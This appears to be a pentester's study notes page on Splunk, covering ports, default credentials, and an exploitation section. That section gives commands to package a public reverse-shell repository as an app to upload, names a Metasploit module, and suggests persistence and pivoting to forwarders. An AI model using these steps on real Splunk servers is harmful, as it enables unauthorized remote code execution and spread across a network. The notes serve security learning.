# Splunk

[![attacking_common_applications](../../../_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)

<div class="row row-cols-lg-2"><div>

[Splunk](https://www.splunk.com/) is a web interface for searching, monitoring, and analyzing machine-generated data in real-time. It's often used as a [SIEM](/cybersecurity/blue-team/topics/logs.md#security-information-and-event-management-siem).

It's a paid software. There is a 60-days free trial for companies.

**Ports** 🐲: 8000 <small>(TCP/HTTPS)</small>, 8089 <small>(TCP/Splunkd)</small>

The [splunkbase](https://splunkbase.splunk.com/) website is the official website to browse for add-ons to extend Splunk usually for a specific usage.
</div><div>
</div></div>

<hr class="sep-both">

## Splunk Pentester Notes ☠️

[![attacking_common_applications](../../../_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![splunkd](../../../_badges/hacktricks/splunkd.svg)](https://book.hacktricks.xyz/network-services-pentesting/8089-splunkd)
[![splunk_lpe_and_persistence](../../../_badges/hacktricks/splunk_lpe_and_persistence.svg)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/splunk-lpe-and-persistence)

<div class="row row-cols-lg-2"><div>

#### Enumeration

* Navigate to `Help > About > Version` to find the version <small>(logged)</small>

#### Foothold

* There is no authentication in the free version. If a trial version that has expired is still installed, if becomes a free version.

* Default credentials are `admin:changeme` in older versions. For newer versions, the password is set at install.
</div><div>

#### Exploitation

There are multiple ways of running code. We can use scripted input such as with [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk) <small>(0.04k ⭐, 2018 🪦)</small>.

To target a Windows host, we need to configure the `run.ps1` script.

```shell!
$ git clone https://github.com/0xjpuff/reverse_shell_splunk
$ cd reverse_shell_splunk/
$ nano reverse_shell_splunk/bin/run.ps1
$ tar -cvzf updater.tar.gz reverse_shell_splunk
```

Navigate to Apps > Edit, and click on "install app from file."

➡️ See also: `use exploit/multi/http/splunk_upload_app_exec`.

➡️ For persistence, we may configure the schedule of the scripted input. If the server is a deployment server, and if target hosts have an `Universal Forwarders` we may be able to compromise them.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Splunkd, Splunk management, communication with Splunk REST API
</div><div>
</div></div>